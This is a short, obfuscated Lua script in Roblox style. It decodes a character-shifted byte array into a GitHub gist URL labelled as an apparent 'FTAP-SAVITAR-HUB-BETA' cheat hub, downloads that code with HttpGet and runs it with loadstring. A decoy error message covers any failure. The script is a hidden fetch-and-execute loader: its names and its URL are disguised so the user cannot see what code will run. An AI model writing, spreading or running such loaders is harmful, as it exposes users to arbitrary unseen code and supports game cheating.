local _0xP=print;local _0xS=string;local _0xT=table;local _0xG=game;
local _0xRAW={111,123,123,119,122,65,54,54,110,112,122,123,53,110,112,123,111,124,105,124,122,108,121,106,118,117,123,108,117,123,53,106,118,116,54,62,90,104,125,112,123,104,121,54,58,60,104,61,108,107,104,108,109,63,109,57,109,61,64,62,57,109,57,109,57,58,63,63,60,106,105,106,58,56,57,108,54,121,104,126,54,105,56,64,105,104,105,107,108,55,55,104,64,58,55,57,58,59,107,60,56,107,106,106,57,108,109,107,106,58,57,56,109,62,108,107,107,108,56,64,60,54,77,91,72,87,52,90,72,93,80,91,72,89,52,79,92,73,52,73,76,91,72}
local _0xK=_0xS.char(7)
local _0xM=function(_0xD,_0xKEY)
    local _0xR=""
    for _0xI=1,#_0xD do
        local _0xC=_0xD[_0xI]
        _0xR=_0xR.._0xS.char(_0xC-_0xKEY:byte(1))
    end
    return _0xR
end
local _0xMAIN=function()
    local _0xURL=_0xM(_0xRAW,_0xK)
    local _0xOK,_0xRES=pcall(function()
        return _0xG:HttpGet(_0xURL,true)
    end)
    if _0xOK then
        local _0xL, _0xERR=loadstring(_0xRES)
        if _0xL then
            task.spawn(_0xL)
        else
            _0xP("Line 1 Fix: Internal Load Error")
        end
    end
end
_0xMAIN()
